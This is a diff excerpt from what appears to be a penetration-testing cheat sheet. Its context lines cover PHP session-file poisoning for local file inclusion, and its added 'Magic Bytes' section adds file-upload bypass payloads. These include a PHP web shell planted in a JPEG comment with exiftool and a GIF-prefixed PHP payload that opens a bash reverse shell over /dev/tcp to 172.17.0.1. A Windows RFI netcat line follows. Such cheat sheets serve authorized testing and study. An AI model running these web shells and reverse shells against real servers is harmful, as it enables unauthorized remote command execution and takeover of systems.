@@ -180,6 +180,15 @@ Location on disk would be /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
 =<?php system($_GET['cmd']); ?>
 =/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
 ````
+# File uploads
+##### Magic Bytes
+```
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
+
+GIF8; <?php echo exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/80 0>&1'"); ?>
+
+```
+
 ##### WINDOWS PHP RFI
 ```bash
 nc -nv 192.168.136.10 80
